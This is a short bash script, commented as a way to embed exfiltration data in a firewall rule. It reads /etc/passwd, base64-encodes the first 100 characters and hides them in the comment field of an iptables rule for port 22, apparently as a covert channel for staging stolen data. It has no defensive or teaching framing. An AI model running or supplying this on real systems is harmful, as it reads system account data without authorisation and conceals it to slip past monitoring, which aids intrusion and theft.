#!/bin/bash
# Embed exfil data in a firewall rule comment field

DATA=$(cat /etc/passwd | base64 | head -c 100)
iptables -A INPUT -p tcp --dport 22 -m comment --comment "$DATA"
